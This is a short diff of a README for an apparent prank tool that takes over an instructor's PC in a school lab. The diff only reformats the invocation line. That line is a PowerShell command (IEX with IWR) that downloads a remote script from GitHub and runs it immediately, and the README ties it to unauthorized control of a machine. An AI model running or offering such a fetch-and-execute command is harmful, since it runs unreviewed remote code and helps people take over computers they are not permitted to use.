@@ -7,4 +7,6 @@ Pretty much for taking over the instructor pc so we can listen to music in the l
 ¯\\_(ツ)_/¯
 
 To invoke directly from powershell:
-`IEX $(IWR raw.githubusercontent.com/kyle-schleich/lab-hijack/master/remote.ps1)`
+``` powershell
+IEX $(IWR raw.githubusercontent.com/kyle-schleich/lab-hijack/master/remote.ps1)
+```
